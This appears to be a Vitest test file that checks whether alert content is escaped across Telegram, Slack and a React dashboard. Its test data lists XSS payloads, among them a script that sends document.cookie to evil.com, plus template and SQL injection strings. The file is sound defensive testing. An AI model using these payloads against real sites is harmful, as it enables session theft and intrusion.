/**
 * Security Chaos Test: XSS / Injection in Alert Content
 *
 * Tests that malicious content in alert titles/bodies is properly escaped
 * across all output surfaces: Telegram HTML, Slack mrkdwn, dashboard JSX.
 *
 * Alert content comes from external sources (Sentry, GitHub, user code)
 * and must NEVER be rendered as executable HTML/script.
 */

import { describe, it, expect } from "vitest";

// Import the actual escape functions used in production
import { esc } from "@/lib/telegram/format";

// Slack's escapeSlack is private, so we test the same logic inline
function escapeSlack(text: string): string {
  return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

// ── XSS payloads to test ──────────────────────────────────────────────────

const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '"><script>document.location="http://evil.com/"+document.cookie</script>',
  "javascript:alert(document.cookie)",
  '<a href="javascript:alert(1)">click</a>',
  '<iframe src="http://evil.com"></iframe>',
  "{{constructor.constructor('return this')()}}", // template injection
  "${7*7}", // template literal injection
  '<div style="background:url(javascript:alert(1))">',
  "'; DROP TABLE alerts; --", // SQL injection (should not affect, but test escaping)
  '<body onload="alert(1)">',
  '<input type="text" onfocus="alert(1)" autofocus>',
  '<marquee onstart=alert(1)>',
];

// ── Tests ───────────────────────────────────────────────────────────────────

describe("Security: XSS / Injection in Alert Content", () => {
  describe("Telegram esc() escapes all HTML", () => {
    for (const payload of XSS_PAYLOADS) {
      it(`escapes: ${payload.slice(0, 50)}...`, () => {
        const escaped = esc(payload);
        expect(escaped).not.toContain("<script");
        expect(escaped).not.toContain("<img");
        expect(escaped).not.toContain("<svg");
        expect(escaped).not.toContain("<iframe");
        expect(escaped).not.toContain("<body");
        expect(escaped).not.toContain("<input");
        expect(escaped).not.toContain("<div");
        expect(escaped).not.toContain("<a ");
        // Verify angle brackets are escaped
        if (payload.includes("<")) {
          expect(escaped).toContain("&lt;");
        }
        if (payload.includes(">")) {
          expect(escaped).toContain("&gt;");
        }
      });
    }

    it("preserves non-dangerous text", () => {
      expect(esc("Normal error message")).toBe("Normal error message");
    });

    it("escapes ampersands", () => {
      expect(esc("foo & bar")).toBe("foo &amp; bar");
    });

    it("double-escaping is safe (idempotent protection)", () => {
      const once = esc('<script>alert(1)</script>');
      const twice = esc(once);
      // Double escaping produces &amp;lt; which is ugly but safe
      expect(twice).not.toContain("<script");
    });
  });

  describe("Slack escapeSlack() escapes all mrkdwn injection", () => {
    for (const payload of XSS_PAYLOADS) {
      it(`escapes: ${payload.slice(0, 50)}...`, () => {
        const escaped = escapeSlack(payload);
        expect(escaped).not.toContain("<script");
        expect(escaped).not.toContain("<img");
        expect(escaped).not.toContain("<svg");
      });
    }

    it("escapes Slack link injection", () => {
      // Slack mrkdwn links: <url|text>
      const payload = '<http://evil.com|Click here>';
      const escaped = escapeSlack(payload);
      expect(escaped).not.toContain("<http");
      expect(escaped).toContain("&lt;http");
    });

    it("escapes Slack user mention injection", () => {
      // Slack user mentions: <@U12345>
      const payload = '<@U12345> injected mention';
      const escaped = escapeSlack(payload);
      expect(escaped).not.toMatch(/^<@/);
      expect(escaped).toContain("&lt;@U12345&gt;");
    });

    it("escapes backtick breakout in code blocks", () => {
      // Code blocks use ``` delimiters
      const payload = '```\nmalicious\n```<script>alert(1)</script>```';
      const escaped = escapeSlack(payload);
      // Backticks pass through (they're mrkdwn formatting, not HTML)
      // but angle brackets are escaped, preventing HTML injection
      expect(escaped).not.toContain("<script");
    });
  });

  describe("React JSX auto-escaping (dashboard)", () => {
    // React auto-escapes text content in JSX: {variable} is always safe
    // This test documents that alert rendering in the dashboard uses
    // text nodes, not dangerouslySetInnerHTML

    it("JSX text interpolation escapes HTML by design", () => {
      // Simulating what React does when rendering {alert.title}
      const maliciousTitle = '<script>alert("xss")</script>';
      // React would render this as literal text, never as HTML
      // We verify our data never needs special handling at the React level
      const escaped = esc(maliciousTitle); // Same escaping Telegram uses
      expect(escaped).toBe('&lt;script&gt;alert("xss")&lt;/script&gt;');
    });
  });

  describe("SQL injection attempts (defense in depth)", () => {
    it("SQL in alert title is treated as text", () => {
      const sqlPayload = "'; DROP TABLE alerts; --";
      // Drizzle ORM uses parameterized queries, so SQL injection
      // via alert content is impossible. But we test that the escaping
      // doesn't somehow mangle the input in a way that creates new vectors.
      const escaped = esc(sqlPayload);
      expect(escaped).toBe("&#x27;; DROP TABLE alerts; --".replace("&#x27;", "'"));
      // Actually esc() only escapes &<>, not quotes. That's fine because:
      // 1. SQL injection is prevented by parameterized queries (Drizzle)
      // 2. HTML injection is prevented by escaping <> (esc/escapeSlack)
      // 3. React prevents client-side injection via JSX auto-escaping
    });
  });

  describe("markdown link URL injection", () => {
    it("markdown link with javascript: protocol is escaped", () => {
      // Slack mrkdwn: <javascript:alert(1)|click me>
      const payload = 'Check <javascript:alert(1)|this link>';
      const escaped = escapeSlack(payload);
      expect(escaped).toContain("&lt;javascript");
    });
  });
});
